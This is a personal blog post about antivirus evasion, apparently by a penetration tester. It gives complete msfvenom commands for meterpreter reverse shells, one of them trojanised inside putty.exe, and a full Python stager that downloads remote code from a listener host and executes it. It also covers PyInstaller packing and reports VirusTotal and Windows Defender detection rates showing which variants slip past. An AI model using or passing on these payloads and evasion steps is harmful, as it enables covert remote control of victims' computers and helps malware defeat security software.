---
layout: post
title:  "Anti-virus evasion"
date:   2018-11-06 00:00:00 +0000
categories: 
---

Let's look into some AV evasion.

The ultimate goal would be to bypass AV with a random executable. But let's start with a meterpreter.

First naive approach:

```
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=172.16.52.211 LPORT=443 -f exe -o putty.exe
```

Resulting hash: 2e40c3010f4dda20ac328a650a2b86d7
VT detection rate: 46/66
Detected by Windows Defender: yes

Second, less naive approach:

```
msfvenom -x putty.exe -k -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=172.16.52.211 LPORT=443 -f exe -o putty2.exe
```

Legitimate `putty.exe` binary used is 32-bit version with hash b6c12d88eeb910784d75a5e4df954001.

Resulting hash: a0b6e343a620a2c581a2e3254ecf3c3b
VT detection rate: 42/64
Detected by Windows Defender: yes


The next test was with Veil framework. I tried different modules, but all had high detection rates.

The best result was with the following approach. Generate a meterpreter Python payload:

```
msfvenom -p python/meterpreter/reverse_https LHOST=172.16.52.211 LPORT=443 -o payload.py
```

Next, change the Python script. Add some comments, relocate variables, etc. From time to time, copy the Python script to Windows to check if Defender detects it.

The following script gave me no detection:

```
import urllib2 
import ssl
import code
import platform
import shutil
import ctypes

hs=[]
sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
sc.check_hostname=False
sc.verify_mode=ssl.CERT_NONE
hs = [urllib2.HTTPSHandler(0,sc)]
o=urllib2.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
a = o.open('https://172.16.52.211:8443/y6dMhbYuJ2qnt7Kj_FZ3WA9h4NKcMpHfiKeIAGUqjkRrlwr5T7-XlYeJQ6cZDZImtt-CWCpJGv_22eCUF37b9fvS8ctL-_rQX3FfxtNdWjlu2v9H9cYYBIL02FopC0YpipIgxwLgr8yBCTlBr4kBiGZxKkTxY6eOlc17fpW')
b = a.read()
exec(b)
```

I had to add some imports because when compiling with PyInstaller afterwards, it will complain about missing modules.

Next, compile with PyInstaller:

```
c:\python27-x64\scripts\pyinstaller --onefile --key haba meterpreter.py
```

The resulting file had the following characteristics:

* MD5: 0b8abf96d6c85d1ad360c5a5e99a56ab
* VT detection rate: 2/66
* Detected by Windows Defender: no

However, when executing the compiled binary, the meterpreter session will open, but a lot of functions (as `shell` for example) will not work. When executing the script with Python directly however, everything works. Some things get broken thus by compiling with PyInstaller.

In the end, this is not a satisfying solution as we cannot rely on the victim having Python on its box. But we can make a few interesting conclusions:

* Manually adapting code seems to be very effective in AV evasion, because we are not relying on some default templates of a well known tool.
* Converting Python meterpreters to native binaries with PyInstaller breaks them.

As a last test, I wanted to try Phantom-Evasion, the 2nd most starred repo on GitHub with the #evasion tag. The setup is not as streamlined as Veil, but the results are a little better.

I tried the `Windows C meterpreter/reverse_http Stager` module, 3 multiple processes behaviour and stripping of the binary. The resulting binary had the following characteristics:

* MD5: 7738cbdcdd71328f851e7f802a570658
* VT detection ratio: 24/66
* Detected by Windows Defender: No 

# Conclusion

In the end the most effective way seems to create its own tool or perform manual adjustments. This was trivial with a Python script. Doing this with a native binary is something else.

This will be one of my goals in the near future!

